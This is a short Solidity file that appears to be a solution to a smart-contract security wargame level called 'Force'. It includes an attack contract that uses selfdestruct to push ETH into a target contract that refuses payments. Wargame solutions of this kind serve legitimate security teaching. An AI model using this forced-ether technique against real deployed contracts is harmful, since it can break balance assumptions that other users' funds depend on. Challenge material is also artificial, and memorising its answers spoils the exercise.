// SPDX-License-Identifier: MIT

/*Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.
*/

pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

//we need to make a contract, depostit some ETH to it, then selfdestruct it and forcefully send ETH to it

contract Hack{
    
    function kill(address payable addr) public payable{
        selfdestruct(addr);
    }

}